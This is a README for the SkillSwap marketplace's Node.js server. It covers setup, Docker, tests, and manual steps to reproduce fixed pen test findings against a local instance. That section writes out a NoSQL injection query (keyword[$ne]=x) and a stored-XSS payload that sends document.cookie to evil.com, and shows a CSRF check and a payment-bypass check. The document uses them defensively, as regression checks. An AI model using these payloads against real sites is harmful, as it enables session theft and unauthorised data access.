# SkillSwap — Server

Node.js + Express API for the SkillSwap peer skill-exchange marketplace.

---

## Requirements

- Node.js 20+
- MongoDB (local or Atlas)
- Stripe account (test keys for development)

---

## Setup

```bash
cd server
npm install
cp .env.example .env   # then fill in your values
```

`.env` values you must set:

| Variable | Description |
|---|---|
| `MONGO_URI` | MongoDB connection string |
| `JWT_SECRET` | Random 64-char string |
| `JWT_REFRESH_SECRET` | Different random 64-char string |
| `ENCRYPTION_KEY` | 64-char hex string (32 bytes) for AES-256 MFA secret encryption |
| `HCAPTCHA_SECRET` | hCaptcha secret key (use `0x0000000000000000000000000000000000000000` for dev) |
| `STRIPE_SECRET_KEY` | `sk_test_…` from Stripe dashboard |
| `STRIPE_WEBHOOK_SECRET` | `whsec_…` from `stripe listen` output |
| `CLIENT_URL` | `http://localhost:5173` in dev |

---

## Run locally

```bash
# Terminal 1 — API server
cd server
npm start          # starts on port 3000

# Terminal 2 — Stripe webhook forwarding (requires Stripe CLI)
stripe listen --forward-to localhost:3000/api/payments/webhook

# Terminal 3 — React frontend
cd client
npm run dev        # starts on port 5173
```

---

## Run with Docker

```bash
# From the project root
docker-compose up --build
```

The compose file starts the Node server and a MongoDB instance. Set env vars in a `.env` file at the project root (Docker picks them up automatically).

---

## Run tests

```bash
cd server
npx jest --forceExit
```

Current test suites:

| File | What it covers |
|---|---|
| `tests/users.test.js` | IDOR protection, mass-assignment prevention, stored XSS regression |
| `tests/logger.test.js` | PII scrubbing — password/token/secret never written to log file |

---

## Manually reproduce each pen test finding

### 1 — NoSQL Injection (keyword search)

**Vulnerable** (fixed — do not revert):
```
GET /api/listings?keyword[$ne]=x
```
Without the fix, Mongoose receives `{ title: { $ne: 'x' } }` and returns all listings.

**After fix**: the query param is cast to `String()` and regex-escaped, so the literal string `[object Object]` is searched — no results.

---

### 2 — Stored XSS (bio field)

```bash
curl -X PATCH http://localhost:3000/api/users/profile \
  -H "Authorization: Bearer <access_token>" \
  -H "Content-Type: application/json" \
  -d '{"bio":"<script>fetch(\"https://evil.com?c=\"+document.cookie)</script>"}'
```

**After fix**: the stored bio contains no `<script>` tag — xss-clean strips it before the value reaches Mongoose.

---

### 3 — CSRF (booking creation)

Without the fix, a cross-origin form POST to `/api/bookings` with a valid session cookie would succeed.

**After fix**: omit the `X-CSRF-Token` header:
```bash
curl -X POST http://localhost:3000/api/bookings \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -b "csrf-token=WRONG" \
  -d '{"listing_id":"...","requested_time":"2026-07-01T10:00:00Z"}'
```
Returns `403 CSRF token missing or invalid`.

---

### 4 — Free session bypass (confirm without payment)

```bash
# Create a booking (payment_status defaults to 'unpaid')
curl -X POST http://localhost:3000/api/bookings \
  -H "Authorization: Bearer <learner_token>" \
  -H "X-CSRF-Token: <csrf>" \
  -d '{"listing_id":"...","requested_time":"2026-08-01T10:00:00Z"}'

# Attempt to confirm without paying (as tutor)
curl -X PATCH http://localhost:3000/api/bookings/<booking_id>/confirm \
  -H "Authorization: Bearer <tutor_token>" \
  -H "X-CSRF-Token: <csrf>"
```

**After fix**: returns `402 Payment required: complete Stripe checkout before confirming`.

---

### 5 — CSP unsafe-inline

```bash
curl -I http://localhost:3000/ | grep -i content-security-policy
```

**After fix**: the header contains `style-src 'self'` with no `unsafe-inline`, and includes `base-uri 'self'`.

---

### 6 — Cookie prefix

```bash
curl -I -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","password":"ValidPass1!"}' \
  | grep -i set-cookie
```

**After fix**: `Set-Cookie: __Host-skillswap-session=…; Path=/; HttpOnly; SameSite=Strict`

---

## Security architecture summary

See [`../docs/security-decisions.md`](../docs/security-decisions.md) for the full rationale behind every security decision.  
See [`../docs/pentest-findings.md`](../docs/pentest-findings.md) for the complete pen test report with CVSS scores and retest evidence.
